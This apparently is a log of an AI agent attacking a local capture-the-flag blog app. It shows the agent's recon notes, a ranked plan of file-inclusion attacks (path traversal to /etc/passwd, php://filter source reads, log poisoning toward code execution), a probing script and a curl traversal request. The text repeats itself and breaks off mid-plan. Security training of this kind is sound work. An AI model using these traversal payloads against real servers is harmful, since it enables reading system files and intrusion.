Welcome to Encoder64 Blog!

e0knbV9hX1NjcmlwdF9LaWRkaWV9

How a Script Kiddie Tried to Hack the Unhackable

A humorous recount of a failed attempt to exploit my blog with a simple LFI vulnerability.

Read More →

EternalBlue: Understanding the Exploit

Exploring the NS …[truncated, 41705 bytes total — narrow with head/tail/grep] --- iter 4 bash --- $ cat <<'EOF' STACK: Apache/2.4.54 (Debian) + PHP/7.4.33 direct HTTP on 127.0.0.1:9100; Bootstrap CDN static frontend; no local source files. SURFACE: /index.php (GET page param for pagination), /post.php?id= discovered in links, /about.php, /contact.php, /static/images/*, plus common routes probed (/robots.txt,/api,/admin,/debug,/healthz,/login*) returned Apache 404. BUG-HYP: /post.php?id=... likely passes id to include/read a PHP file; evidence: link values are PHP filenames (ScriptKiddie.php, EternalBlue.php, etc.) and visible text mentions a simple LFI vulnerability; stack is PHP. WHY: Server headers show PHP/7.4.33; homepage Read More links are post.php?id=*.php and category is lfi; page contains base64-themed hint/header. BREADTH VECTORS (ranked): 1 LFI traversal on post.php?id to /etc/passwd; 2 PHP filter source disclosure of post.php/index.php; 3 wrapper/data/php input RCE; 4 log poisoning via Apache access log; 5 source/backup files (.bak, ~, .swp, .txt); 6 hidden endpoints/contact form injection; 7 base64 hint/encoded params; 8 static file/path disclosure. PLAN: - HYPOTHESIS: post.php id is file include/read with insufficient traversal filtering (evidence: id values are PHP filenames and LFI-themed blog text). - ATTACK CHAIN: confirm include with normal posts → traverse/read /etc/passwd → use php://filter or traversal to read source/interesting files → locate flag path or escalate to RCE via log wrapper → read flag over HTTP. - FIRST PROBE: curl -is 'http://127.0.0.1:9100/post.php?id=../../../../etc/passwd' - ABANDON IF: post.php rejects traversal uniformly and encoded/non-recursive bypasses plus php://filter/source/backup probes produce no behavioral delta. EOF echo '===== harvest normal pages/routes =====' python3 - <<'PY' import requests,re,hashlib,urllib.parse base='http://127.0.0.1:9100' paths=['/index.php','/about.php','/contact.php','/post.php?id=ScriptKiddie.php','/post.php?id=EternalBlue.php','/post.php?id=Introduction-to-Machine-Learning.php','/post.php?id=The-Importance-of-Cybersecurity.php','/post.php?id=Advances-in-Renewable-Energy.php'] for p in paths: r=requests.get(base+p,timeout=5) print('\n===',p,'status',r.status_code,'len',len(r.text),'sha',hashlib.sha256(r.content).hexdigest()[:12]) print('title/snips:', re.findall(r'(.*?)|]*>(.*?)|]*>(.*?)|href=["\']([^"\']+)', r.text)[:20]) PY echo '===== first LFI probe =====' curl -isS --max-time 5 'http://127.0.0.1:9100/post.php?id=../../../../etc/passwd' STACK: Apache/2.4.54 (Debian) + PHP/7.4.33 direct HTTP on 127.0.0.1:9100; Bootstrap CDN static frontend; no local source files. SURFACE: /index.php (GET page param for pagination), /post.php?id= discovered in links, /about.php, /contact.php, /static/images/*, plus common routes probed (/robots.txt,/api,/admin,/debug,/healthz,/login*) returned Apache 404. BUG-HYP: /post.php?id=... likely passes id to include/read a PHP file; evidence: link values are PHP filenames (ScriptKiddie.php, EternalBlue.php, etc.) and visible text mentions a simple LFI vulnerability; stack is PHP. WHY: Server headers show PHP/7.4.33; homepage Read More links are post.php?id=*.php and category is lfi; page contains base64-themed hint/header. PLAN: - HYPOTHESIS: post.php id is file include/read with insufficient traversal filtering (evidence: id values are PHP filenames and LFI-themed blog text). - ATTACK CHAIN: confirm include with normal
